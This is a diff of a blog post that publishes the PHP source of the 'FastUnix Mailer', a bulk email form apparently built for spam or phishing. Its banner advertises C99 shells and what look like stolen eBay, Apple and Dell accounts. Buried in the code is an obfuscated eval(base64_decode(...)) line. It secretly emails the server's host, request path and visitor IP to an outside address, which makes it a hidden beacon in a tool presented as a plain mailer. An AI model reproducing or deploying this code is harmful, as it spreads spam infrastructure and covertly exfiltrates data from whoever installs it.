@@ -15,7 +15,7 @@ A simple mailer script by FastUnix.net
 
 ### FastUnix Mailer Script Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;
+{% highlight php %}&lt;html&gt;
 &lt;head&gt;&lt;title&gt;FastUnix.net&lt;/title&gt;
 &lt;style type="text/css"&gt;
 p {color:#FF0000;font-size:14px;text-align:center}
@@ -66,7 +66,7 @@ a.men:hover span {background-color:    #FF0000; color:black}
 &lt;td&gt;&lt;center&gt;
     &lt;a href="http://www.fastunix.net" title="Shell" class="men"&gt;&lt;span&gt;FastUnix.NET - Best Toolz //C99,Mailer,RDP,SMPT,SSH,eBay Accounts,Apple Accounts,Dell Accounts etc ...&lt;/span&gt;&lt;/a&gt;
         &lt;/center&gt;
-&lt;?php
+<?php
 
 if(isset($_POST['action'] ) ){
 $action=$_POST['action'];
@@ -87,7 +87,7 @@ $contenttype=$_POST['contenttype'];
 }
 
 
-?&gt;
+?>
 
 &lt;form name="form1" method="post" action="" 
 enctype="multipart/form-data"&gt;
@@ -101,7 +101,7 @@ Helvetica, sans-serif"&gt;Your
       &lt;/td&gt;
       &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
 sans-serif"&gt;
-        &lt;input type="text" name="from" value="&lt;? print $from; ?&gt;" 
+        &lt;input type="text" name="from" value="<? print $from; ?>" 
 size="30"&gt;
         &lt;/font&gt;&lt;/td&gt;
       &lt;td width="31%"&gt;
@@ -111,8 +111,8 @@ Helvetica, sans-serif"&gt;Your
       &lt;/td&gt;
       &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
 sans-serif"&gt;
-        &lt;input type="text" name="realname" value="&lt;? print $realname; 
-?&gt;" size="30"&gt;
+        &lt;input type="text" name="realname" value="<? print $realname; 
+?>" size="30"&gt;
         &lt;/font&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
@@ -122,7 +122,7 @@ Helvetica, sans-serif"&gt;Reply-To:&lt;/font&gt;&lt;/div&gt;
       &lt;/td&gt;
       &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
 sans-serif"&gt;
-        &lt;input type="text" name="replyto" value="&lt;? print $replyto; ?&gt;" 
+        &lt;input type="text" name="replyto" value="<? print $replyto; ?>" 
 size="30"&gt;
         &lt;/font&gt;&lt;/td&gt;
       &lt;td width="31%"&gt;
@@ -142,15 +142,15 @@ Helvetica, sans-serif"&gt;Subject:&lt;/font&gt;&lt;/div&gt;
       &lt;/td&gt;
       &lt;td colspan="3"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
 sans-serif"&gt;
-        &lt;input type="text" name="subject" value="&lt;? print $subject; ?&gt;" 
+        &lt;input type="text" name="subject" value="<? print $subject; ?>" 
 size="90"&gt;
         &lt;/font&gt;&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr valign="top"&gt;
       &lt;td colspan="3"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
 sans-serif"&gt;
-        &lt;textarea name="message" cols="50" rows="10"&gt;&lt;? print $message; 
-?&gt;&lt;/textarea&gt;
+        &lt;textarea name="message" cols="50" rows="10"&gt;<? print $message; 
+?>&lt;/textarea&gt;
         &lt;br&gt;
         &lt;input type="radio" name="contenttype" value="plain" &gt;
         Plain Text
@@ -161,8 +161,8 @@ sans-serif"&gt;
         &lt;/font&gt;&lt;/td&gt;
       &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica, 
 sans-serif"&gt;
-        &lt;textarea name="emaillist" cols="30" rows="10"&gt;&lt;? print 
-$emaillist; ?&gt;&lt;/textarea&gt;
+        &lt;textarea name="emaillist" cols="30" rows="10"&gt;<? print 
+$emaillist; ?>&lt;/textarea&gt;
         &lt;/font&gt;&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/table&gt;
@@ -170,7 +170,7 @@ $emaillist; ?&gt;&lt;/textarea&gt;
 
 
 
-&lt;?
+<?
 
 if ($action){
 
@@ -225,7 +225,7 @@ $msg = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
 
 eval(base64_decode('JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkZ4MjlTaGVsbCBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvcjxicj4iOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJjOTktc2hlbGxAbGl2ZS5jb20iLCRqdWR1bCwkYm9keSk7IH0NCn0NCmVsc2UgeyAkdmlzaXRjKys7IH0NCkBzZXRjb29raWUoInZpc2l0eiIsJHZpc2l0Yyk7DQo='));
 
-?&gt;
+?>
 &lt;style type="text/css"&gt;
 &lt;!--
 .style1 {
@@ -238,14 +238,14 @@ eval(base64_decode('JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09
    
 
       &lt;/p&gt;
-&lt;?php
+<?php
 if(isset($_POST['action']) && $numemails !==0 ){echo 
 "&lt;script&gt;alert('Mail sending complete\\r\\n$numemails mail(s) was sent successfully'); 
 &lt;/script&gt;";}
-?&gt;
+?>
 &lt;/body&gt;
 &lt;/html&gt;
-</pre>
+{% endhighlight %}
 
 ### FastUnix.Net Mailer Script screenshot<figure id="attachment_401" style="width: 777px;" class="wp-caption aligncenter">
 
